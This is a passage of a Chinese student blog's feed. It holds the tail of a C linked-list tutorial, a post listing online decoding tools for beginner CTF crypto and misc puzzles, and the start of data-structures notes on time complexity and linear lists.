class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line">fp = fp-&gt;next;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="清空"><a class="markdownIt-Anchor" href="#清空"></a> 清空</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FreeList</span><span class="params">()</span> <span class="comment">//链表清空</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = <span class="title">head</span>;</span> <span class="comment">//记录头，防止头被修改，丢内存</span></span><br><span class="line"><span class="keyword">while</span> (pTemp != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">fp</span> = <span class="title">pTemp</span>;</span></span><br><span class="line">pTemp = pTemp-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(fp);</span><br><span class="line">}</span><br><span class="line"><span class="comment">//头尾清空</span></span><br><span class="line">head = <span class="literal">NULL</span>;</span><br><span class="line">tail = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="空头链表"><a class="markdownIt-Anchor" href="#空头链表"></a> 空头链表</h3><p>空头链表和无空头链表其实本质区别不大，空头链表就是头结点为空（有头指针，但是没有数值域）在进行某些操</p><p>作的时候就比较简单；</p><p>空头链表和无空头链表相似度很高，部分操作相同，就不一一列举了；</p><h4 id="头文件函数声明结构体全局变量-2"><a class="markdownIt-Anchor" href="#头文件函数声明结构体全局变量-2"></a> 头文件+函数声明+结构体+全局变量</h4><h5 id="头文件根据使用的语言自行修改-2"><a class="markdownIt-Anchor" href="#头文件根据使用的语言自行修改-2"></a> 头文件（根据使用的语言自行修改）</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><h5 id="函数声明-2"><a class="markdownIt-Anchor" href="#函数声明-2"></a> 函数声明</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct Node* <span class="title">CreateNode</span><span class="params">(<span class="keyword">int</span> n)</span></span>;<span class="comment">//创建节点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NewList</span><span class="params">()</span></span>;<span class="comment">//空头链表初始化</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddHead</span><span class="params">(<span class="keyword">int</span> n)</span></span>; <span class="comment">// 头添加</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddTail</span><span class="params">(<span class="keyword">int</span> n)</span></span>; <span class="comment">//尾添加</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddRand</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> n)</span></span>;<span class="comment">//在数字index后面添加数字a</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteHead</span><span class="params">()</span></span>;<span class="comment">//删除头</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteTail</span><span class="params">()</span></span>;<span class="comment">//删除尾</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteNode</span><span class="params">(<span class="keyword">int</span> n)</span></span>;<span class="comment">//删除指定节点</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SeekList</span><span class="params">()</span></span>; <span class="comment">//遍历</span></span><br><span class="line"><span class="function">struct Node* <span class="title">SearchNode</span><span class="params">(<span class="keyword">int</span> n)</span></span>; <span class="comment">//查找指定节点，并返回节点地址</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FreeList</span><span class="params">()</span></span>;<span class="comment">//释放链表</span></span><br></pre></td></tr></tbody></table></figure><h5 id="结构体-2"><a class="markdownIt-Anchor" href="#结构体-2"></a> 结构体</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//节点结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span> <span class="comment">//指向下一个节点的指针</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="全局变量-2"><a class="markdownIt-Anchor" href="#全局变量-2"></a> 全局变量</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//链表头尾指针（全局变量）</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">head</span> = <span class="title">NULL</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">tail</span> = <span class="title">NULL</span>;</span></span><br></pre></td></tr></tbody></table></figure><h4 id="空头链表初始化"><a class="markdownIt-Anchor" href="#空头链表初始化"></a> 空头链表初始化</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NewList</span><span class="params">()</span><span class="comment">//空头链表初始化</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//链表空头</span></span><br><span class="line">head = (struct Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct Node));</span><br><span class="line">head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">tail = head;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="创建节点"><a class="markdownIt-Anchor" href="#创建节点"></a> 创建节点</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct Node* <span class="title">CreateNode</span><span class="params">(<span class="keyword">int</span> n)</span><span class="comment">//创建节点</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = (<span class="title">struct</span> <span class="title">Node</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">Node</span>));</span><span class="comment">//创建一个节点</span></span><br><span class="line"><span class="keyword">if</span> (pTemp == <span class="literal">NULL</span>)<span class="comment">//创建失败</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">pTemp-&gt;a = n; <span class="comment">//节点成员赋值</span></span><br><span class="line">pTemp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> pTemp;<span class="comment">//返回节点</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="添加-2"><a class="markdownIt-Anchor" href="#添加-2"></a> 添加</h4><h5 id="头添加-2"><a class="markdownIt-Anchor" href="#头添加-2"></a> 头添加</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddHead</span><span class="params">(<span class="keyword">int</span> n)</span> <span class="comment">// 头添加</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = <span class="title">CreateNode</span>(<span class="title">n</span>);</span><span class="comment">//创建一个节点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pTemp == <span class="literal">NULL</span>)<span class="comment">//创建失败</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"内存不足\n"</span>);<span class="comment">// 一般不会申请失败，除非内存不足</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//连接</span></span><br><span class="line">pTemp-&gt;next = head-&gt;next;</span><br><span class="line">head-&gt;next = pTemp;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="尾添加-2"><a class="markdownIt-Anchor" href="#尾添加-2"></a> 尾添加</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddTail</span><span class="params">(<span class="keyword">int</span> n)</span> <span class="comment">//尾添加</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = <span class="title">CreateNode</span>(<span class="title">n</span>);</span><span class="comment">//创建一个节点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pTemp == <span class="literal">NULL</span>)<span class="comment">//创建失败</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"内存不足\n"</span>);<span class="comment">// 一般不会申请失败，除非内存不足</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//连接</span></span><br><span class="line">tail-&gt;next = pTemp;</span><br><span class="line">tail = pTemp;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="任意位置添加-2"><a class="markdownIt-Anchor" href="#任意位置添加-2"></a> 任意位置添加</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddRand</span><span class="params">(<span class="keyword">int</span> index,<span class="keyword">int</span> n)</span><span class="comment">//在数字index后面添加数字a</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (head-&gt;next == <span class="literal">NULL</span>)<span class="comment">//判断链表有没有东西</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"链表无节点\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//找index节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = <span class="title">SearchNode</span>(<span class="title">index</span>);</span></span><br><span class="line"><span class="keyword">if</span> (pTemp == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"查无此节点\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//找到节点,连接到指定位置</span></span><br><span class="line"><span class="comment">//创建节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pNode</span> = <span class="title">CreateNode</span>(<span class="title">n</span>);</span></span><br><span class="line"><span class="comment">//连接</span></span><br><span class="line"><span class="keyword">if</span> (pTemp == tail)</span><br><span class="line">{</span><br><span class="line">AddTail(n);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">pNode-&gt;next = pTemp-&gt;next;</span><br><span class="line">pTemp-&gt;next = pNode;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="删除-2"><a class="markdownIt-Anchor" href="#删除-2"></a> 删除</h4><h5 id="头删除-2"><a class="markdownIt-Anchor" href="#头删除-2"></a> 头删除</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteHead</span><span class="params">()</span><span class="comment">//删除头</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (head-&gt;next == <span class="literal">NULL</span>)<span class="comment">//判断链表有没有东西</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"链表无头"</span>); </span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//有节点 ——&gt; 删除  </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pTemp</span> = <span class="title">head</span>-&gt;<span class="title">next</span>;</span> <span class="comment">//记录头</span></span><br><span class="line">head-&gt;next = head-&gt;next-&gt;next;  <span class="comment">//变头</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(pTemp);<span class="comment">//释放</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="尾删除-2"><a class="markdownIt-Anchor" href="#尾删除-2"></a> 尾删除</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteTail</span><span class="params">()</span><span class="comment">//删除尾</span></span></span><br><span class="line"><span class="function"></span>{ </span><br><span class="line"><span class="keyword">if</span> (head-&gt;next == <span class="literal">NULL</span>)<span class="comment">//判断链表有没有东西</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"链表无尾"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//有一个节点 ——&gt; 删除</span></span><br><span class="line"><span class="keyword">if</span> (head-&gt;next == tail)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">free</span>(tail);</span><br><span class="line">head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">tail = head;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">struct Node* pTemp = head-&gt;next;</span><br><span class="line"><span class="keyword">while</span> (pTemp != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(pTemp-&gt;next == tail)</span><br><span class="line">{ </span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line">pTemp = pTemp-&gt;next;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//pTemp就是尾巴的前一个</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(tail); <span class="comment">//释放尾巴</span></span><br><span class="line">tail = pTemp; <span class="comment">//更新尾巴</span></span><br><span class="line">tail-&gt;next = <span class="literal">NULL</span>; <span class="comment">//尾巴下一个赋值为NULL</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>到这里，剩下的操作和无空头的没啥区别，这里就不多说了</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF常用工具汇总</title>
      <link href="/posts/ctf-tools/"/>
      <url>/posts/ctf-tools/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>假期做了很多CTF的题目，刚学没多久，只会简单的MISC和CRYPTO，网上搜集各种解密类型，</p><p>一个个去尝试，先整理一波；</p><a id="more"></a><p>整理这个是因为收藏夹满了，工具堆叠太多（噗哈哈哈，其实因为自己太懒，不想做题的时候再去搜），话不多说</p><p>直接上网址；</p><h4 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h4><p>之前就喜欢密码学，了解的不是很多，但是感觉超厉害！！！Very Good！！！</p><p>做了题目知道了很多密码：Base64，ROT13，摩斯密码，凯撒密码，栅栏密码，幂数加密（计算就可以，或者写</p><p>个脚本），RSA加密（到现在还没看懂原理emmm）</p><p><a href="http://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">16进制文本转换</a></p><p><a href="http://tool.chinaz.com/Tools/Base64.aspx" target="_blank" rel="noopener">Base64</a></p><p><a href="https://tool.lu/morse/" target="_blank" rel="noopener">Morse</a></p><p><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php" target="_blank" rel="noopener">Caesar</a></p><p><a href="https://www.jisuan.mobi/puzzm6z1B1HH6yXW.html" target="_blank" rel="noopener">ROT13</a></p><p><a href="http://www.atoolbox.net/Tool.php?Id=777" target="_blank" rel="noopener">W型栅栏密码</a></p><p><a href="https://www.sojson.com/encrypt_aes.html" target="_blank" rel="noopener">AES</a></p><p><a href="https://www.sojson.com/encrypt_rabbit.html" target="_blank" rel="noopener">Rabbit</a></p><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">Ook</a></p><p><a href="https://tool.bugku.com/brainfuck/?wafcloud=1" target="_blank" rel="noopener">Brainfuck</a></p><p><a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">serpent</a></p><p><a href="http://web.chacuo.net/charsetquotedprintable" target="_blank" rel="noopener">Quoted-printable</a></p><p><a href="https://pmd5.com/" target="_blank" rel="noopener">MD5</a></p><p><a href="http://code.mcdvisa.com" target="_blank" rel="noopener">中文电码</a></p><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">quipqiup</a></p><p><a href="http://www.atoolbox.net/Category.php?Id=27" target="_blank" rel="noopener">加密解密工具</a></p><p><a href="https://blog.csdn.net/weixin_42037232/article/details/89018997?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">密码积累</a></p><h4 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h4><p>杂项题目更头疼，五花八门的解密方法，确实让人头疼。还得精通ps（真是佩服），有一道p二维码的题，p了一</p><p>个晚上；</p><p><a href="https://www.sojson.com/qr/deqr.html" target="_blank" rel="noopener">二维码</a></p><p><a href="https://app.xunjiepdf.com/pdf2word/" target="_blank" rel="noopener">PDF转-&gt;</a></p><p><a href="http://keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a></p><p><a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">新约佛论禅</a></p><h4 id="tools"><a class="markdownIt-Anchor" href="#tools"></a> Tools</h4><p><a href="http://ctf.ssleye.com/?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">CTF在线工具</a></p><p><a href="https://www.ctftools.com/down/" target="_blank" rel="noopener">CTF资源库</a></p><h4 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h4><p>CTF是个很好玩的“游戏”，现在虽然是个小白，但是我要努力成为大佬，题目越做越多，后面再进行整理。</p><p>Fighting！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构</title>
      <link href="/posts/shujujiegou/"/>
      <url>/posts/shujujiegou/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>数据结构是学习语言过程中必会内容，对以后做项目，工作会有很大的帮助；</p><p>下学期开数据结构课，所以将学习记的一些笔记写进blog里面；</p><p>后面会不定时的更新；</p><a id="more"></a><h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>算法（Algorithm）是指解题方案的准确而完整的描述，是一系列解决问题的清晰指令，算法代表着用系统的方法</p><p>描述解决问题的策略机制；简单来讲，就是解决问题的方法和机制；</p><h2 id="数据结构概念"><a class="markdownIt-Anchor" href="#数据结构概念"></a> 数据结构概念</h2><p>数据结构：是相互之间存在一种或多种特定关系的数据结构元素的集合；</p><h2 id="算法特点"><a class="markdownIt-Anchor" href="#算法特点"></a> 算法特点</h2><p>1、有穷性：算法在执行有限的步骤之后，自动结束而不会出现无限循环，并且每一步骤在可接受的时间内完成；</p><p>2、确定性：算法的每一步骤都有确定的含义，不会出现二义性；</p><p>3、可行性：算法的每一步都必须是可行的，也就是说，每一步都能够通过执行有限次数完成；</p><p>4、输入输出：0至多个输入，1至多个输出；</p><h2 id="程序设计"><a class="markdownIt-Anchor" href="#程序设计"></a> 程序设计</h2><p><strong>程序 = 数据结构 + 算法；</strong></p><h1 id="时间复杂度"><a class="markdownIt-Anchor" href="#时间复杂度"></a> 时间复杂度</h1><p>定义：算法的时间复杂度，也就是算法的时间量度，记作：T(n) = O(f(n))(T(n)是语句总的执行次数)，它表示随问</p><p>题规模n的增大，算法执行时间的增长率和f(n)的增长率相同，称作算法的渐进时间复杂度，简称为时间复杂度。</p><p>其中f(n)是问题的规模n的某个函数；</p><h2 id="推导大o阶方法"><a class="markdownIt-Anchor" href="#推导大o阶方法"></a> 推导大O阶方法</h2><p>1、用常数1取代运行时间中的所有加法常数；</p><p>2、在修改后的运行次数函数中，只保留最高阶项；</p><p>3、如果最高阶项存在且不是1，则去除与这个项相乘的常数；</p><p>得到的的结果就是大O阶；</p><h2 id="常见的时间复杂度"><a class="markdownIt-Anchor" href="#常见的时间复杂度"></a> 常见的时间复杂度</h2><p>常数阶    ——&gt;    O(1)</p><p>线性阶    ——&gt;    O(n)</p><p>平方阶    ——&gt;    O(n^2)</p><p>对数阶    ——&gt;    O(logn)</p><p><u>nlogn</u>阶  ——&gt;    O(nlogn)</p><p>立方阶    ——&gt;    O(n^3)</p><p>指数阶    ——&gt;    O(2^n)</p><h2 id="常见的时间复杂度所耗时间的大小排列"><a class="markdownIt-Anchor" href="#常见的时间复杂度所耗时间的大小排列"></a> 常见的时间复杂度所耗时间的大小排列</h2><p><strong>O(1)&lt;O(logn)&lt;O(n)&lt;O(nlogn)&lt;O(n<sup>2)&lt;O(n</sup>3)&lt;O(2<sup>n)&lt;O(n!)&lt;O(n</sup>n)</strong></p><h2 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h2><p>算法的时间复杂度内容不多，很好理解，从下一章开始就将进入代码的世界；</p><p>拜拜啦~</p><h1 id="线性表linear-list"><a class="markdownIt-Anchor" href="#线性表linear-list"></a> 线性表—Linear List</h1><p>学完时间复杂度，基本打开了数据结构的大门了，第一个我们来学线性表~</p><h2 id="定义"><a class="markdownIt-Anchor" href="#定义"></a> 定义</h2><p>1、定义：n(n≥0)个<u>数据元素</u>的有限序列；</p><p>2、线性表是一种最常用且最简单的数据结构，含有n个元素的线性表是一个数据结构；</p><p>3、List = (D,R)  ——&gt;  D是data数据，R是relation关系；</p><h2 id="前驱后继"><a class="markdownIt-Anchor" href="#前驱后继"></a> 前驱后继</h2><p>若将线性表记为a1,a2,a3…ai-1,ai,ai+1…an,则称ai-1是ai的直接前驱元素，ai+1是ai的直接后继元素。当</p><p>i=1,2,3…n-1时，ai有且仅有一个直接后继，当i=2,3,4…n时，ai有且仅有一个直接前驱；</p><p>所以，线性表的元素的个数n(n≥0)定义为线性表的长度，当n=0时，称为空表；</p><h2 id="线性表的抽象数据类型基本操作-增-删-查-取-空-长"><a class="markdownIt-Anchor" href="#线性表的抽象数据类型基本操作-增-删-查-取-空-长"></a> 线性表的抽象数据类型——基本操作( 增 删 查 取 空 长 )</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、InitList(*L) <span class="comment">//初始化,建立一个新的线性表L；</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、ListEmpty(L) <span class="comment">//线性表为空，返回true，否则返回false；</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、ListLength(L) <span class="comment">//求长度，返回线性表中元素的个数；</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、GetElem(L,i,*e) <span class="comment">//将线性表L中第i个数据元素赋值给e；</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、LocateElem(L,e) <span class="comment">//在线性表L中查找与给定值e相等的元素，如果查找成功，返回该元素在表中序号表示成功，否则，返回0表示失败；</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、ListInsert(*L,i,e) <span class="comment">//在线性表L中第i个位置插入新的数据e，表长+1；</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>、ListDelete(*L,i,e) <span class="comment">//删除线性表L中第i个数据元素，e返回其值，表长-1；</span></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>、ClearList(*L) <span class="comment">//将线性表清空；</span></span><br></pre></td></tr></tbody></table></figure><h2 id="线性表的顺序存储结构顺序表"><a class="markdownIt-Anchor" href="#线性表的顺序存储结构顺序表"></a> 线性表的顺序存储结构——顺序表</h2><h3 id="定义-2"><a class="markdownIt-Anchor" href="#定义-2"></a> 定义</h3><p>线性表的顺序存储结构，指的是用一段地址连续的储存单元依次储存线性表的数据元素；</p><h3 id="顺序储存方式"><a class="markdownIt-Anchor" href="#顺序储存方式"></a> 顺序储存方式</h3><p>先来看看结构代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span 